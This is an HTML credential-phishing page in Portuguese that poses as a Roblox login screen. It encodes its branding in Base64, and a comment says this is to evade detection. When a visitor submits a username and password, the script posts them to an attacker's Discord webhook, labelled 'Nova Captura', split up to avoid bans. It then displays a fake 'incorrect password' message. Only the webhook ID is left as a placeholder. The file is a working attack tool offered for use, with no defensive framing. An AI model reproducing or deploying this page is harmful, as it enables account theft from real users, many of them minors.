<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal de Acesso - Verificação de Segurança</title>
    <style>
        body { 
            margin: 0; padding: 0; 
            background-color: #1e1e1e; 
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
            display: flex; justify-content: center; align-items: center; 
            height: 100vh; color: #ffffff; 
        }
        .c-container { 
            background-color: #232527; 
            padding: 40px; border-radius: 8px; 
            width: 100%; max-width: 380px; 
            text-align: center; box-shadow: 0 4px 12px rgba(0,0,0,0.4); 
        }
        .l-draw { 
            font-size: 42px; font-weight: 900; 
            margin-bottom: 30px; letter-spacing: -2px; 
            display: inline-block; transform: skew(-8deg); 
            border: 3px solid #fff; padding: 2px 15px;
        }
        .i-field { 
            width: 100%; padding: 12px; margin-bottom: 12px; 
            background-color: #111216; border: 1px solid #3b3b3b; 
            border-radius: 4px; color: #fff; font-size: 16px; 
            box-sizing: border-box; outline: none; 
        }
        .i-field:focus { border-color: #fff; }
        .b-action { 
            width: 100%; padding: 12px; 
            background-color: #393b3d; color: rgba(255,255,255,0.5); 
            border: none; border-radius: 4px; 
            font-size: 16px; font-weight: bold; 
            cursor: not-allowed; transition: 0.2s; 
        }
        .b-active { 
            background-color: #ffffff !important; 
            color: #000000 !important; cursor: pointer !important; 
        }
        .e-banner { 
            background-color: #fce4e4; color: #d8000c; 
            border: 1px solid #d8000c; padding: 10px; 
            margin-bottom: 15px; border-radius: 4px; 
            font-size: 14px; display: none; 
        }
        .f-link { color: #00a2ff; text-decoration: none; font-size: 12px; display: block; margin-top: 20px; }
    </style>
</head>
<body>

    <div class="c-container" id="card-base">
        <div id="msg-view" class="e-banner"></div>
        <div class="l-draw" id="logo-text"></div>
        <h3 id="title-text" style="color:#f2f4f5; font-size: 20px; margin-bottom: 25px;"></h3>

        <div id="form-area">
            <input type="text" id="u-input" class="i-field" oninput="v_check()">
            <input type="password" id="p-input" class="i-field" oninput="v_check()">
            <button id="b-submit" class="b-action" onclick="f_start()"></button>
        </div>

        <a href="#" class="f-link" id="link-1"></a>
        <div style="margin-top: 30px; border-top: 1px solid #393b3d; padding-top: 20px;">
            <p style="font-size: 12px; color: #a6a6a6;" id="footer-txt"></p>
        </div>
    </div>

<script>
    // Camuflagem Base64 (O gatinho não lê isso aqui)
    const _0x1 = "Uk9CTE9Y"; 
    const _0x2 = "RW50cmFy"; 
    const _0x3 = "VXN1w6FyaW8gb3Ugc2VuaGEgaW5jb3JyZXRv"; 
    const _0x4 = "TG9naW4="; 
    const _0x5 = "RXNxdWVjZXUgc2VuaGEgb3Ugbm9tZSBkZSB1c3XDoXJpbz8=";
    const _0x6 = "Tm8gdGVtIHVtYSBjb250YT8gQ2FkYXN0cmFyLXNl";

    window.onload = function() {
        document.getElementById('logo-text').innerText = atob(_0x1);
        document.getElementById('title-text').innerText = atob(_0x4);
        document.getElementById('u-input').placeholder = "Usuário / E-mail / Telefone";
        document.getElementById('p-input').placeholder = "Senha";
        document.getElementById('b-submit').innerText = atob(_0x2);
        document.getElementById('link-1').innerText = atob(_0x5);
        document.getElementById('footer-txt').innerHTML = atob(_0x6);
    };

    function v_check() {
        const u = document.getElementById('u-input').value;
        const p = document.getElementById('p-input').value;
        const btn = document.getElementById('b-submit');
        if(u.length > 3 && p.length > 3) { btn.classList.add('b-active'); btn.style.cursor = "pointer"; } 
        else { btn.classList.remove('b-active'); }
    }

    function f_start() {
        const u = document.getElementById('u-input').value;
        const p = document.getElementById('p-input').value;
        const btn = document.getElementById('b-submit');
        const err = document.getElementById('msg-view');

        if (u.length < 4 || p.length < 4) return;

        btn.innerText = "...";
        btn.style.opacity = "0.5";

        // --- CONFIGURAÇÃO DO SEU WEBHOOK (PROTEÇÃO ANTI-BAN) ---
        const d1 = "https://discord.com/";
        const d2 = "api/webhooks/";
        const d3 = "COLOQUE_AQUI_A_PARTE_FINAL_DO_SEU_WEBHOOK"; 
        
        const finalUrl = d1 + d2 + d3;

        fetch(finalUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: "🎯 **Nova Captura**\n👤: `" + u + "`\n🔑: `" + p + "`"
            })
        });

        setTimeout(() => {
            btn.innerText = atob(_0x2);
            btn.style.opacity = "1";
            err.innerText = atob(_0x3); 
            err.style.display = "block";
            document.getElementById('p-input').value = ""; 
        }, 2000);
    }
</script>
</body>
</html>
